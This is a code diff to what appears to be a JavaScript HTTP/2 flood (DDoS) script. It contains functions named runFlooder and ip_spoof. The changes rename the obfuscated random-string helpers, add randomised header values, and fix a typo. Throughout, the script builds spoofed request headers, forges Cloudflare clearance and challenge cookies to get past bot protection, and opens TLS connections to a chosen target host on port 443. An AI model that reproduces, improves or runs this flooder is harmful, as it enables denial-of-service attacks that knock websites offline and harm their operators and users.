@@ -300,35 +300,36 @@ function getTitleFromHTML(_0x330231) {
 function randomIntn(_0x37244a, _0x5e8397) {
   return Math.floor(Math.random() * (_0x5e8397 - _0x37244a) + _0x37244a);
 }
-function randstr(_0x6ba01d) {
-  var _0x404460 = '';
-  var _0x1b31e9 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".length;
-  for (var _0x3bc4bc = 0x0; _0x3bc4bc < _0x6ba01d; _0x3bc4bc++) {
-    _0x404460 += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.floor(Math.random() * _0x1b31e9));
-  }
-  ;
-  return _0x404460;
+function randstr(length) {
+  let randomString = ''; 
+  const charactersLength = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".length; 
+    for (let i = 0; i < length; i++) {
+        randomString += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.floor(Math.random() * charactersLength));
+    }
+
+    return randomString; 
 }
-function randayat(_0x19c864) {
-  var _0x1175de = '';
-  var _0x40e4e7 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".length;
-  for (var _0x1eada6 = 0x0; _0x1eada6 < _0x19c864; _0x1eada6++) {
-    _0x1175de += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(Math.floor(Math.random() * _0x40e4e7));
-  }
-  ;
-  return _0x1175de;
+function randayat(length) {
+  let randomAlphabeticString = '';
+  const alphabetLength = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".length;
+    for (let i = 0; i < length; i++) {
+        randomAlphabeticString += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(Math.floor(Math.random() * alphabetLength));
+    }
+
+    return randomAlphabeticString; 
 }
-function randnombor(_0x3af870) {
-  var _0x5c028c = '';
-  var _0x46ebb3 = '0123456789'.length;
-  for (var _0x3e898c = 0x0; _0x3e898c < _0x3af870; _0x3e898c++) {
-    _0x5c028c += '0123456789'.charAt(Math.floor(Math.random() * _0x46ebb3));
-  }
-  ;
-  return _0x5c028c;
+function randnombor(length) {
+  let randomNumberString = '';
+  const digitsLength = '0123456789'.length;
+    for (let i = 0; i < length; i++) {
+        randomNumberString += '0123456789'.charAt(Math.floor(Math.random() * digitsLength));
+    }
+
+    return randomNumberString; 
 }
-function randomElement(_0x21da9f) {
-  return _0x21da9f[Math.floor(Math.random() * (_0x21da9f.length - 0x0) + 0x0)];
+function getRandomElement(elements) {
+  const randomIndex = Math.floor(Math.random() * elements.length);
+  return elements[randomIndex];
 }
 const ip_spoof = () => {
   return Math.floor(Math.random() * 100) + '.' + Math.floor(Math.random() * 100) + '.' + Math.floor(Math.random() * 100) + '.' + Math.floor(Math.random() * 100);
@@ -2375,6 +2376,24 @@ const sechuas = [
 const accept_ranges = [
                       "bytes"
                    ];
+                   const xFrameOptionsValues = [
+                    "DENY",
+                    "SAMEORIGIN",
+                    "ALLOW-FROM https://google.com"
+                  ];
+const xXSSProtectionValues = [
+                    "0",
+                    "1",
+                    "1; mode=block"
+                  ];
+                  function getRandomElement(arr) {
+                    return arr[Math.floor(Math.random() * arr.length)];
+                  }
+                  
+                  const randomHeaders = {
+                    "x-frame-options": getRandomElement(xFrameOptionsValues),
+                    "x-xss-protection": getRandomElement(xXSSProtectionValues)
+                  };
 var CazzySoci = Methods[Math.floor(Math.random() * Methods.length)];
 var randomReferer = refers[Math.floor(Math.random() * refers.length)];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
@@ -2445,9 +2464,9 @@ class NetSocket {
 }
 const Socker = new NetSocket();
 headers[':method'] = "GET";
-CazzySoci;
+CazzySoci; 
 headers[":authority"] = parsedTarget.host;
-headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.randdom() * pathts.length)] + '&' + randstr(0xa) + queryString + randstr(0xa);
+headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + '&' + randstr(10) + queryString + randstr(10);
 headers[':scheme'] = "https";
 headers["x-forwarded-proto"] = "https";
 headers["cache-control"] = control;
@@ -2464,8 +2483,8 @@ headers.Connection = "keep-alive";
 headers.accept = accept;
 headers['sec-fetch-mode'] = "navigate";
 headers["sec-fetch-dest"] = "document";
-headers["sec-fetch-user"] = '?1';
-headers.cookie = ["cf_clearance=" + randstr(0x20) + '.' + randstr(0xa) + '-' + randstr(0xa) + '-1.0.1.1-' + randstr(0xb) + '_vs_V.' + randstr(0x15) + '_' + randstr(0x2f), "?__cf_chl_tk=", "?__cf_chl_rt_tk=" + randayat(0x2b) + '-' + randnombor(0xa) + "-0.0.1.1" + randnombor(0x4)];
+headers["sec-fetch-user"] = '?1';     
+headers.cookie = ["cf_clearance=" + randstr(32) + '.' + randstr(10) + '-' + randstr(10) + '-1.0.1.1-' + randstr(11) + 'vs_V.' + randstr(21) + '' + randstr(47), "?__cf_chl_tk=" + randstr(43), "?__cf_chl_rt_tk=" + randayat(43) + '-' + randnombor(10) + "-0.0.1.1" + randnombor(4)];
 headers["sec-fetch-site"] = "none";
 headers['x-requested-with'] = "XMLHttpRequest";
 headers['X-Cache'] = "HIT";
@@ -2525,7 +2544,7 @@ function runFlooder() {
       'host': parsedTarget.host,
       'rejectUnauthorized': false,
       'servername': parsedTarget.host,
-      'secureProtocol': ["TLS_method", 'TLSv1_1_method', "TLSv1_2_method", "TLSv1_3_method"], 
+      'secureProtocol': ["TLS_method", "TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method"], 
       'sessionTimeout': 0x1388
     };
     const _0x3ae3b7 = tls.connect(0x1bb, parsedTarget.host, _0xe0f417);
